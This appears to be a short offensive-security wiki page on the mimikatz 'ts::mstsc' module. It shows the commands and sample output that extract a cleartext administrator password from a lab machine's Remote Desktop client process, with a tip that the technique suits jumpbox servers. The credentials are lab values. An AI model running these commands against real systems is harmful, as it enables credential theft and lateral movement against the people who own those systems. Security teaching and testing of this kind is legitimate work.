# mstsc

This module can be used to extracts cleartext credentials from the mstsc process \(client side\)

```text
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # ts::mstsc
!!! Warning: false positives can be listed !!!

| PID 2992      mstsc.exe (module @ 0x000000000055F6F0)

ServerName                                [wstring] '192.168.0.239'
ServerFqdn                                [wstring] ''
UserSpecifiedServerName                   [wstring] '192.168.0.239'
UserName                                  [wstring] 'administrator'
Domain                                    [wstring] 'hacklab'
Password                                  [protect] 'Super_SecretPass1!'
SmartCardReaderName                       [wstring] ''
PasswordContainsSCardPin                  [ bool  ] FALSE
ServerNameUsedForAuthentication           [wstring] '192.168.0.239'
RDmiUsername                              [wstring] 'hacklab\administrator'
```

{% hint style="warning" %}
It must be noted that an RDP session must be running in order to retrieve credentials via `ts::mstsc`. It comes in handy in jumpbox servers!
{% endhint %}

_\(Demonstration target is a Windows 10 Pro\)_

